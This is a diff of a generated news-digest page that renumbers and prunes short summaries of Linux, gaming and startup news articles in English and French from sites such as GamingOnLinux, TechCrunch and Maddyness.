-### 96. `EN` [No Man's Sky Remnant update brings a fancy gravity gun and customizable trucks](data/articles/85452d31e71944b99c70fa66ca21e64e.html)
+### 98. `EN` [No Man's Sky Remnant update brings a fancy gravity gun and customizable trucks](data/articles/85452d31e71944b99c70fa66ca21e64e.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 No Man's Sky is gradually turning into a playground, and now you can mess with physics in the No Man's Sky Remnant update. Read the full article on GamingOnLinux.
 
@@ -7475,7 +7518,7 @@ No Man's Sky is gradually turning into a playground, and now you can mess with p
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 97. `EN` [Overwatch has returned with new heroes and a new UI](data/articles/b104a8e90f85fd53082ec4a6e952bc9f.html)
+### 99. `EN` [Overwatch has returned with new heroes and a new UI](data/articles/b104a8e90f85fd53082ec4a6e952bc9f.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Overwatch has returned with the "2" now in the bin, along with a big content update with new heroes and a new lobby UI. Read the full article on GamingOnLinux.
 
@@ -7483,7 +7526,7 @@ Overwatch has returned with the "2" now in the bin, along with a big content upd
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 98. `EN` [Retro Macintosh games Return to Dark Castle and Beyond Dark Castle arrive on Steam in March](data/articles/d8953ff10aa12163b2d8f1b2fd4c870f.html)
+### 100. `EN` [Retro Macintosh games Return to Dark Castle and Beyond Dark Castle arrive on Steam in March](data/articles/d8953ff10aa12163b2d8f1b2fd4c870f.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Return to Dark Castle and Beyond Dark Castle are classic Macintosh games from the 80s, and they're getting a bundled definitive edition re-release on Steam. Read the full article on GamingOnLinux.
 
@@ -7491,7 +7534,7 @@ Return to Dark Castle and Beyond Dark Castle are classic Macintosh games from th
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 99. `EN` [Wireless VR streaming levels up on Linux with the latest WiVRn release](data/articles/b410774414eb4827fc1cc3306e4d4457.html)
+### 101. `EN` [Wireless VR streaming levels up on Linux with the latest WiVRn release](data/articles/b410774414eb4827fc1cc3306e4d4457.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Have a VR headset and want to do some gaming from your Linux PC? WiVRn has a new release out that should make the experience even better. Read the full article on GamingOnLinux.
 
@@ -7499,7 +7542,7 @@ Have a VR headset and want to do some gaming from your Linux PC? WiVRn has a new
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 100. `EN` [Valve fix up rumble related controller latency in the latest Steam Beta](data/articles/e4d9e2df1de2a07fd5d7576b1d4198e7.html)
+### 102. `EN` [Valve fix up rumble related controller latency in the latest Steam Beta](data/articles/e4d9e2df1de2a07fd5d7576b1d4198e7.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 A small but useful Steam Beta update has arrived and it's an especially good one for controller players that have rumble enabled. Read the full article on GamingOnLinux.
 
@@ -7507,7 +7550,7 @@ A small but useful Steam Beta update has arrived and it's an especially good one
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 101. `EN` [Clever auto-battling racer Backseat Champions has a demo out now](data/articles/c93503428189740b13d66e944b4f0255.html)
+### 103. `EN` [Clever auto-battling racer Backseat Champions has a demo out now](data/articles/c93503428189740b13d66e944b4f0255.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Taking some of the elements of survivor-likes and putting them into a tactical racing game, Backseat Champions has a really fun idea with a demo out now. Read the full article on GamingOnLinux.
 
@@ -7515,7 +7558,7 @@ Taking some of the elements of survivor-likes and putting them into a tactical r
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 102. `FR` [Projets Libres saison 4 épisode 11 : PVH éditions, une maison d'édition libérée et dans le Fediverse](data/articles/d70a6c6f40e372a575a4b71489d5ec49.html)
+### 104. `FR` [Projets Libres saison 4 épisode 11 : PVH éditions, une maison d'édition libérée et dans le Fediverse](data/articles/d70a6c6f40e372a575a4b71489d5ec49.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Nous avons eu le plaisir de rencontrer Lionel Jeannerat durant les Rencontres Hivernales du libre à Saint-Cergue (VD) en janvier 2026. son parcours
 la maison d'édition et ses œuvres
@@ -7531,7 +7574,7 @@ lien nᵒ 6 : Le site des Rencontres Hivernales du libre Télécharger ce conte
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 103. `EN` [CrossOver 26 released with Wine 11.0 and NTSync support](data/articles/2ae2db734449775605d045966d4ec513.html)
+### 105. `EN` [CrossOver 26 released with Wine 11.0 and NTSync support](data/articles/2ae2db734449775605d045966d4ec513.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 CrossOver 26 is out with new Windows app and game compatibility, Wine 11.0 and NYSync support to make running Windows software on Linux even smoother.
 You're reading CrossOver 26 released with Wine 11.0 and NTSync support, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7540,7 +7583,7 @@ You're reading CrossOver 26 released with Wine 11.0 and NTSync support, a blog p
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 104. `EN` [Cine is a sleek, MPV-powered video player for GNOME](data/articles/f07837eeaed8a6ab8c04612f961336a4.html)
+### 106. `EN` [Cine is a sleek, MPV-powered video player for GNOME](data/articles/f07837eeaed8a6ab8c04612f961336a4.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Cine is a new GTK4/libadwaita video player for Linux using an MPV backend. We take a look at the app as Ubuntu 26.04 prepares to swap Totem for Showtime.
 You're reading Cine is a sleek, MPV-powered video player for GNOME, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7549,7 +7592,7 @@ You're reading Cine is a sleek, MPV-powered video player for GNOME, a blog post 
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 105. `FR` [Meilleures contributions LinuxFr.org : les primées de janvier 2026](data/articles/b57fd0beb1d6890e8e09d40814164855.html)
+### 107. `FR` [Meilleures contributions LinuxFr.org : les primées de janvier 2026](data/articles/b57fd0beb1d6890e8e09d40814164855.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Nous continuons sur notre lancée de récompenser celles et ceux qui chaque mois contribuent au site LinuxFr.org (dépêches, , logo, journaux, correctifs, etc.). Vous n’êtes pas sans risquer de gagner un livre des éditions Eyrolles, ENI et D-Booker. Voici les gagnants du mois de janvier 2026 :
 Stefane Fermigier, pour sa dépêche « Appel à de la Commission "Vers des écosystèmes numériques ouverts européens" » ;
@@ -7565,7 +7608,7 @@ Linux — Maîtrisez l'administration du système — 7e édition. Certaines per
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 106. `EN` [JetBrains enables Wayland support by default in IntelliJ 2026.1](data/articles/1cd6cef67a9b908ba2908f722d94403c.html)
+### 108. `EN` [JetBrains enables Wayland support by default in IntelliJ 2026.1](data/articles/1cd6cef67a9b908ba2908f722d94403c.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 JetBrains confirms native Wayland support for IntelliJ IDEs starting in 2026.1. The move from X11 improves scaling and performance for Linux developers.
 You're reading JetBrains enables Wayland support by default in IntelliJ 2026.1, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -7620,39 +7663,17 @@ Dans un rapport intitulé "l'industrie européenne face au rouleau compresseur c
 
 ## Entrepreneurship / Entrepreneuriat
 
-<div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
-
-### 1. `FR` [1 entrepreneur sur 4 songe à redevenir un salarié d’ici 2027](data/articles/f1400a28236cffbf0a7e7e95297c44c7.html)
-**Source:** Maddyness | **Keyword:** `Entrepreneuriat`
-La French Tech va-t-elle perdre un vivier important d’entreteneurs dans peu de temps ? Cette hypothèse est bel et bien réelle d’après une étude de Qonto menée auprès de 1 600 entrepreneurs en Europe, avec un échantillon représentatif en France.
-D’après l’analyse de la fintech tricolore, menée avec l’institut Appinio, 1 entrepreneur français sur 4 (24,5 %) envisage de revenir au salariat d’ici 2027. C'est tout simplement un record en Europe, où la moyenne se situe autour de 16 %. L’Hexagone est ainsi très loin devant l'Italie (16 %), l'Espagne (15 %) et l'Allemagne (8,5 % seulement).
-Les Français aiment l’entrepreneuriat
-Pourtant, les Français ne rejettent pas l’entrepreneuriat. Bien au contraire ! C’est en effet un choix de carrière ment délibéré, rarement subi, pour 96 % des sondés. Seulement 23 % se tournent vers cette voie par dépit, notamment à cause d’une perte d’emploi ou d’une mauvaise expérience salariale.
-Parmi les raisons invoquées par les entrepreneurs pour prendre leur indépendance, l’équilibre entre la vie pro/vie perso (36 %), la liberté créative (33 %) et la flexibilité personnelle (19 %) arrivent en tête. 11 % des entrepreneurs tricolores estiment même que l’indépendance est l’outil ultime pour reconquérir son temps et sa liberté personnelle. Chez nos voisins européens, ce sont plutôt la nécessité économique en Espagne et l’autonomie créative en Allemagne qui
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 2. `EN` [Just 8 months in, India’s vibe-coding startup Emergent claims ARR of over $100M](data/articles/9f7f5c5dd19ff94be9c740e595d46dee.html)
+### 1. `EN` [Just 8 months in, India’s vibe-coding startup Emergent claims ARR of over $100M](data/articles/9f7f5c5dd19ff94be9c740e595d46dee.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Indian vibe-coding platform Emergent was launched just eight months ago, and it now says it's generating annual recurring revenue of more than $100 million, thanks to surging demand by small businesses and non-technical users.
 
 </div>
 
-<div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
-
-### 3. `FR` [Pour sa quinzième édition, le One to One Monaco décrypte les tendances de l’IA et les mutations du retail](data/articles/4a68ac6b3a168aa3ff019b0b00163c4d.html)
-**Source:** Maddyness | **Keyword:** `Entrepreneuriat`
-Depuis 15 ans, le One to One Retail E-commerce propose aux décideurs et prestataires de solutions de se retrouver autour de rendez-vous qualifiés : grâce à un matchmaking et des rencontres construites en amont, l’événement garantit des échanges orientés business afin d’optimiser le temps de chaque participant où 85 % des rendez-vous débouchent sur un contrat. Ainsi, l’édition 2026 prévoit d’accueillir 1150 décideurs, 200 prestataires et un village de 20 startups travaillant sur l’IA, l’expérience client ou la tokenisation. « Pendant 3 jours, les participants sont dans une bulle business, orchestrée par les rendez-vous d’affaires, des moments de networking, des conférences et des ateliers pour rentrer avec un plan d’action concret au bureau » précise Sonia Mamin, directrice des événements One to One Retail à Monaco. « Ce format permet aux décideurs de gagner un temps précieux dans un contexte de transformation constante du marché et donc d’arbitrages. »
-Un événement pensé pour accélérer les décisions business
-Cette année, l’événement déroule son fil rouge 2026 autour de la relation tripartite marque–client–agent IA et les décisions que cette mutation impose. L’objectif ? En sélectionnant rigoureusement les décideurs selon leurs projets d’investissement, et les prestataires en mesure d’y répondre, le One to One Retail E-commerce permet aux participants de concentrer les écha
-
-</div>
-
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 4. `EN` [African defense tech Terra Industries, founded by two Gen Zers, raises additional $22M in a month](data/articles/c415155d21ca2a0c95b44c8baecfba1c.html)
+### 2. `EN` [African defense tech Terra Industries, founded by two Gen Zers, raises additional $22M in a month](data/articles/c415155d21ca2a0c95b44c8baecfba1c.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Terra Industries, the African defense company, announced Monday that it had secured an additional $22 million in funding to further expand the business.
 
@@ -7660,7 +7681,7 @@ Terra Industries, the African defense company, announced Monday that it had secu
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 5. `EN` [Warren Buffett’s Final Berkshire Bet Revealed in New Filing—It’s a Business He Once Called ‘Toast’](data/articles/77fe26d764ebdf7fcacf520d6e9e3648.html)
+### 3. `EN` [Warren Buffett’s Final Berkshire Bet Revealed in New Filing—It’s a Business He Once Called ‘Toast’](data/articles/77fe26d764ebdf7fcacf520d6e9e3648.html)
 **Source:** Inc.com | **Keyword:** `Business`
 After years of exiting newspapers, Berkshire Hathaway quietly returned to one.
 
@@ -7668,7 +7689,7 @@ After years of exiting newspapers, Berkshire Hathaway quietly returned to one.
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Inc.com">
 
-### 6. `FR` [26 Reasons Founders Get Burned Out](data/articles/1acad4804ac78535639e39520c7c2562.html)
+### 4. `FR` [26 Reasons Founders Get Burned Out](data/articles/1acad4804ac78535639e39520c7c2562.html)
 **Source:** Inc.com | **Keyword:** `Business`
 Learn lessons from these successful entrepreneurs to avoid your own burnout.
 
@@ -7676,7 +7697,7 @@ Learn lessons from these successful entrepreneurs to avoid your own burnout.
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 7. `EN` [Kana emerges from stealth with $15M to build flexible AI agents for marketers](data/articles/a54b98cef3d453f7c3ca6304599e46a5.html)
+### 5. `EN` [Kana emerges from stealth with $15M to build flexible AI agents for marketers](data/articles/a54b98cef3d453f7c3ca6304599e46a5.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Kana, a new AI marketing startup from the founders of Rapt and Krux, has raised $15 million to build customizable, agent-based marketing tools.
 
@@ -7684,7 +7705,7 @@ Kana, a new AI marketing startup from the founders of Rapt and Krux, has raised 
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 8. `EN` [Can Entrepreneurs Save Capitalism From Itself?](data/articles/68df74ea36af22d5d954841458cf840c.html)
+### 6. `EN` [Can Entrepreneurs Save Capitalism From Itself?](data/articles/68df74ea36af22d5d954841458cf840c.html)
 **Source:** Inc.com | **Keyword:** `Business`
 In our new book, Capital Evolution: The New American Economy we argue that capitalism’s next chapter won’t be written by policymakers alone.
 
@@ -7692,7 +7713,7 @@ In our new book, Capital Evolution: The New American Economy we argue that capi
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 9. `EN` [4 Ways to Attract More Clients as a Solopreneur](data/articles/d277ffee00aa03c79d9597e1c6fc2ccf.html)
+### 7. `EN` [4 Ways to Attract More Clients as a Solopreneur](data/articles/d277ffee00aa03c79d9597e1c6fc2ccf.html)
 **Source:** Inc.com | **Keyword:** `Business`
 As a solo business owner, the key to winning clients is about building trust.
 
@@ -7700,7 +7721,7 @@ As a solo business owner, the key to winning clients is about building trust.
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 10. `EN` [Why Amazon Founder Jeff Bezos Says the Answer to This Question Is the Surest Path to Business Success](data/articles/c4e7afe11a356d492bf4e818c995443e.html)
+### 8. `EN` [Why Amazon Founder Jeff Bezos Says the Answer to This Question Is the Surest Path to Business Success](data/articles/c4e7afe11a356d492bf4e818c995443e.html)
 **Source:** Inc.com | **Keyword:** `Business`
 Sure, be innovative, but first, focus on things that won’t change.
 
@@ -7708,7 +7729,7 @@ Sure, be innovative, but first, focus on things that won’t change.
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
 
-### 11. `FR` [OSS Ventures lance un fonds de 75 millions d’euros pour faire naître des champions du logiciel industriel](data/articles/53b597fbed73fc4d0b666864e51b4153.html)
+### 9. `FR` [OSS Ventures lance un fonds de 75 millions d’euros pour faire naître des champions du logiciel industriel](data/articles/53b597fbed73fc4d0b666864e51b4153.html)
 **Source:** Maddyness | **Keyword:** `Entrepreneuriat`
 Entre la tech et l’industrie, c’est : «Je t’aime, moi non plus !» Pour réconcilier ces deux univers, pourtant complémentaires et plus encore à l’ère de l’intelligence artificielle, Renan Devillières tente d’apporter une réponse avec OSS Ventures, un venture studio spécialisé dans la création de logiciels industriels B2B.
 En ce début d’année, la structure, qui combine donc un startup studio et un fonds d’investissement, annonce un premier closing de 40 millions d’euros pour son nouveau véhicule d’investissement, avec une taille cible de 75 millions d’euros. Pour monter ce fonds, OSS Ventures a pu compter sur soutien de Decathlon Pulse, la branche du distributeur sportif lancée à l’été 2024 pour investir dans les startups du sport et du bien-être, et Teknor Apex. Les investisseurs historiques, dont le groupe Peugeot Frères et Tikehau Capital, ont également remis au pot à cette occasion.
@@ -7720,7 +7741,7 @@ Depuis sa création en 2019, le venture studio tricolore a lancé une trentaine 
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
 
-### 12. `FR` [À l'ère des robots : investir dans l'avenir](data/articles/060efbd1efc112e975ba4875fe496847.html)
+### 10. `FR` [À l'ère des robots : investir dans l'avenir](data/articles/060efbd1efc112e975ba4875fe496847.html)
 **Source:** Maddyness | **Keyword:** `Entrepreneuriat`
 Enjeu stratégique pour l’industrie, la robotique permet de répondre aux pénuries de main-d’œuvre, de réduire la pénibilité et d’ouvrir de nouvelles perspectives de croissance. Selon lui, la France et l’Europe doivent jouer un rôle moteur sur ces sujets. L’épisode aborde aussi les différentes stratégies d’investissement et la nécessité de créer des coopérations concrètes entre entrepreneurs, industriels et investisseurs.
 Il revient enfin sur l’importance d’un partenaire bancaire réactif, capable de comprendre les enjeux du projet et d’accompagner sa croissance.
@@ -7729,28 +7750,15 @@ Il revient enfin sur l’importance d’un partenaire bancaire réactif, capable
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 13. `EN` [Stop Trying to Please Everyone. The Businesses That Win Do This Instead](data/articles/efa1b29c6d51cf118e3ecf2e4ea74ff4.html)
+### 11. `EN` [Stop Trying to Please Everyone. The Businesses That Win Do This Instead](data/articles/efa1b29c6d51cf118e3ecf2e4ea74ff4.html)
 **Source:** Inc.com | **Keyword:** `Business`
 Some businesses are born from opportunity. Others are born from conviction.
 
 </div>
 
-<div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
-
-### 14. `FR` [Trésorerie, bonus, prime : que faire d’une soudaine rentrée d’argent ?](data/articles/d70acde5d48316a18c008bd1176effc2.html)
-**Source:** Maddyness | **Keyword:** `Entrepreneuriat`
-Recevoir une somme d’argent inattendue comme un bonus, une prime, un héritage, une cession de parts, ou avoir une trésorerie qui gonfle… Cela fait partie de ces “bons problèmes” que l’on rêve d’avoir. Et pourtant. Passé l’euphorie, une question s’impose vite : qu’en faire, concrètement ? Faut-il sécuriser ? Investir ? Attendre une période plus favorable ?
-Dans un contexte économique et politique instable, la réponse est d’autant moins évidente. Alors pour y voir plus clair, nous avons interrogé Alexis Trigaut, Directeur commercial et Associé chez CORUM L’Épargne, qui accompagne au quotidien particuliers et entrepreneurs face à ce genre de décisions.
-L’argent qui dort… par réflexe de prudence
-Le constat de départ est sans appel : les Français épargnent encore beaucoup. Rien qu’en 2025, ce sont 6 600 milliards d’euros qui ont été “mis de côté” dans l’Hexagone et ce alors que, comme le souligne Alexis Trigaut, “les rendements des placements sécurisés comme le Livret A sont faibles, avec un taux de 1,5 % depuis février 2026.
-“À l’approche d’une période électorale ou en temps d’incertitude, on observe souvent une contraction de la prise de décision. On repousse ses investissements, on attend de voir.” Une posture attentiste qui n’est pas nécessairement problématique. Attendre peut être une stratégie - à condition que ce soit un choix réfléchi, et non un réflexe subi…
-La pire erre
-
-</div>
-
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 15. `FR` [Financer le logiciel industriel : le pari d’OSS VENTURES](data/articles/e426f50de11a10d86382df0ac2dfa889.html)
+### 12. `FR` [Financer le logiciel industriel : le pari d’OSS VENTURES](data/articles/e426f50de11a10d86382df0ac2dfa889.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 Alors que l’industrie représente 25 % du PIB seules 1 % des startups dans le secteur trouve un financement. Pour combler ce paradoxe, OSS VENTURES a construit un modèle à contre-courant. Le fonds annonce avoir déjà recueilli 44 millions d’euros pour son nouveau véhicule et vise les 75 millions, pour en parler nous recevons son …
 
@@ -7758,7 +7766,7 @@ Alors que l’industrie représente 25 % du PIB seules 1 % des startups dans le 
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 16. `EN` [This Beloved Fast-Food Chain Is Shuttering Hundreds of Locations](data/articles/54a64d2a1d541693a696eeb7acaa8b07.html)
+### 13. `EN` [This Beloved Fast-Food Chain Is Shuttering Hundreds of Locations](data/articles/54a64d2a1d541693a696eeb7acaa8b07.html)
 **Source:** Inc.com | **Keyword:** `Business`
 The CEO of Wendy’s outlined a turnaround plan, including more ‘hamburger innovation,’ in the chain’s recent earnings call.
 
@@ -7766,15 +7774,15 @@ The CEO of Wendy’s outlined a turnaround plan, including more ‘hamburger inn
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Maddyness">
 
-### 17. `FR` [«Qui veut être mon associé ?» : M6 lance une plateforme pour surfer sur le succès de son émission dédiée à l’entrepreneuriat](data/articles/8bb1442b4098570eb28bee250e7bc078.html)
+### 14. `FR` [«Qui veut être mon associé ?» : M6 lance une plateforme pour surfer sur le succès de son émission dédiée à l’entrepreneuriat](data/articles/8bb1442b4098570eb28bee250e7bc078.html)
 **Source:** Maddyness | **Keyword:** `Entrepreneuriat`
-The Wayback Machine is an initiative of the Internet Archive, a 501(c)(3) non-profit, building a digital library of Internet sites and other cultural artifacts in digital form. Other projects include Open Library &amp; archive-it.org. Your use of the Wayback Machine is subject to the Internet Archive's Terms of Use.
+«Qui veut être mon associé ?» : M6 lance une plateforme pour surfer sur le succès de son émission dédiée à l’entrepreneuriat
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="Inc.com">
 
-### 18. `EN` [Apple Is Making a Major Change to Its Podcasts App. It Arrives This Spring](data/articles/316942978f5698329e97e0371d81b8b1.html)
+### 15. `EN` [Apple Is Making a Major Change to Its Podcasts App. It Arrives This Spring](data/articles/316942978f5698329e97e0371d81b8b1.html)
 **Source:** Inc.com | **Keyword:** `Business`
 The switch will give listeners new options—and provide new business opportunities for podcasters and advertisers.
 
@@ -7782,7 +7790,7 @@ The switch will give listeners new options—and provide new business opportunit
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 19. `EN` [Mistral AI buys Koyeb in first acquisition to back its cloud ambitions](data/articles/abbb0c744962611fda717cd2dcb4f847.html)
+### 16. `EN` [Mistral AI buys Koyeb in first acquisition to back its cloud ambitions](data/articles/abbb0c744962611fda717cd2dcb4f847.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Mistral AI has agreed to buy Koyeb, a Paris-based startup that simplifies AI app deployment at scale and manages the infrastructure behind it.
 
@@ -7790,7 +7798,7 @@ Mistral AI has agreed to buy Koyeb, a Paris-based startup that simplifies AI app
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 20. `EN` [SpaceX vets raise $50M Series A for data center links](data/articles/5766acb5c5e42ff09d3134d7fac1e2ef.html)
+### 17. `EN` [SpaceX vets raise $50M Series A for data center links](data/articles/5766acb5c5e42ff09d3134d7fac1e2ef.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Mesh aims to mass-produce optical transceivers for AI data centers.
 
@@ -7798,7 +7806,7 @@ Mesh aims to mass-produce optical transceivers for AI data centers.
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 21. `EN` [SpendRule raises $2M, emerges from stealth to help hospitals track spending](data/articles/5cc2061eb87d68a788a47faea36e3abd.html)
+### 18. `EN` [SpendRule raises $2M, emerges from stealth to help hospitals track spending](data/articles/5cc2061eb87d68a788a47faea36e3abd.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 SpendRule, launched last summer, is an AI-powered platform that helps healthcare systems track their spending.
 
@@ -7806,7 +7814,7 @@ SpendRule, launched last summer, is an AI-powered platform that helps healthcare
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="Journal du Net">
 
-### 22. `FR` [Que pensent les investisseurs de la French tech de Qui veut être mon associé ?](data/articles/78bafea8c0785423de258162bfe268b9.html)
+### 19. `FR` [Que pensent les investisseurs de la French tech de Qui veut être mon associé ?](data/articles/78bafea8c0785423de258162bfe268b9.html)
 **Source:** Journal du Net | **Keyword:** `Tech`
 Trois membres de fonds de capital-risque donnent leur analyse sur le programme diffusé sur M6, qui, malgré plusieurs défauts, a le mérite de démocratiser l'investissement et l'entrepreneuriat.
 
@@ -7814,7 +7822,7 @@ Trois membres de fonds de capital-risque donnent leur analyse sur le programme d
 
 <div class="article-item" data-lang="fr" data-category="entrepreneurship" data-source="FrenchWeb">
 
-### 23. `FR` [De l’électronique de puissance à l’OS industriel : la trajectoire de GYS ?](data/articles/641a0f67a5b4033f66c694e475ed99c5.html)
+### 20. `FR` [De l’électronique de puissance à l’OS industriel : la trajectoire de GYS ?](data/articles/641a0f67a5b4033f66c694e475ed99c5.html)
 **Source:** FrenchWeb | **Keyword:** `Tech`
 L’industrie se reconfigure sous l’effet conjugué de l’électronique de puissance, du logiciel et de l’interconnexion des systèmes. Ses produits deviennent des architectures complexes, ses usines des environnements numériques, et ses cycles d’innovation des trajectoires longues. Invité de Perspective, Bruno Bouygues, dirigeant de GYS, entreprise basée à Laval et présente dans cent trente pays, décrit cette …
 
@@ -7822,7 +7830,7 @@ L’industrie se reconfigure sous l’effet conjugué de l’électronique de pu
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 24. `EN` [As AI data centers hit power limits, Peak XV backs Indian startup C2i to fix the bottleneck](data/articles/f7275eb2393110d25fd44d8f60f5a2c4.html)
+### 21. `EN` [As AI data centers hit power limits, Peak XV backs Indian startup C2i to fix the bottleneck](data/articles/f7275eb2393110d25fd44d8f60f5a2c4.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 C2i has raised $15 million as it tests a grid-to-GPU approach to reducing power losses in AI data centers.
 
@@ -7830,7 +7838,7 @@ C2i has raised $15 million as it tests a grid-to-GPU approach to reducing power 
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 25. `EN` [Blackstone backs Neysa in up to $1.2B financing as India pushes to build domestic AI infrastructure](data/articles/2bd2cc215ebda8ba09b16dcc32f3ef07.html)
+### 22. `EN` [Blackstone backs Neysa in up to $1.2B financing as India pushes to build domestic AI infrastructure](data/articles/2bd2cc215ebda8ba09b16dcc32f3ef07.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Neysa is targeting deployments of more than 20,000 GPUs over time as demand for local AI compute accelerates.
 
@@ -7838,15 +7846,7 @@ Neysa is targeting deployments of more than 20,000 GPUs over time as demand for 
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 26. `EN` [OpenClaw creator Peter Steinberger joins OpenAI](data/articles/0aae42736e23fff8c217ddfe1214d055.html)
-**Source:** TechCrunch Startups | **Keyword:** `Tech`
-OpenAI said OpenClaw will live on as an open source project.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
-
-### 27. `EN` [What the Epstein files reveal about EV startups and Silicon Valley](data/articles/a23a4cd8fe81115df2c6a092f90296ca.html)
+### 23. `EN` [What the Epstein files reveal about EV startups and Silicon Valley](data/articles/a23a4cd8fe81115df2c6a092f90296ca.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 Will the Epstein revelations lead to broader fallout in Silicon Valley?
 
@@ -7854,7 +7854,7 @@ Will the Epstein revelations lead to broader fallout in Silicon Valley?
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 28. `EN` [How to get into a16z’s super-competitive Speedrun startup accelerator program](data/articles/161c20c0e2786554a57c0e0b22386842.html)
+### 24. `EN` [How to get into a16z’s super-competitive Speedrun startup accelerator program](data/articles/161c20c0e2786554a57c0e0b22386842.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 TechCrunch spoke to a16z partner Joshua Lu for some tips on standing out for the Speedrun program.
 
@@ -7862,15 +7862,7 @@ TechCrunch spoke to a16z partner Joshua Lu for some tips on standing out for the
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 29. `EN` [Is safety ‘dead’ at xAI?](data/articles/a7380418621b34c458792ba1d30241a6.html)
-**Source:** TechCrunch Startups | **Keyword:** `Tech`
-Elon Musk is “actively” working to make xAI’s Grok chatbot “more unhinged," according to a former employee.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
-
-### 30. `EN` [In a changed VC landscape, this exec is doubling down on overlooked founders](data/articles/81c590bfdd02e94c300aae6b9ddcab32.html)
+### 25. `EN` [In a changed VC landscape, this exec is doubling down on overlooked founders](data/articles/81c590bfdd02e94c300aae6b9ddcab32.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
 As much of Silicon Valley chases mega-rounds and buzzy AI deals, Stacy Brown-Philpot is running Cherryrock Capital like a throwback to venture capital's earlier days.
 
@@ -7878,7 +7870,7 @@ As much of Silicon Valley chases mega-rounds and buzzy AI deals, Stacy Brown-Phi
 
 <div class="article-item" data-lang="en" data-category="entrepreneurship" data-source="TechCrunch Startups">
 
-### 31. `EN` [‘Clueless’ -inspired app Alta partners with brand Public School to start integrating styling tools into websites](data/articles/fb8299a97284d1d83b978e881a5345ad.html)
+### 26. `EN` [‘Clueless’ -inspired app Alta partners with brand Public School to start integrating styling tools into websites](data/articles/fb8299a97284d1d83b978e881a5345ad.html)
 **Source:** TechCrunch Startups | **Keyword:** `Tech`
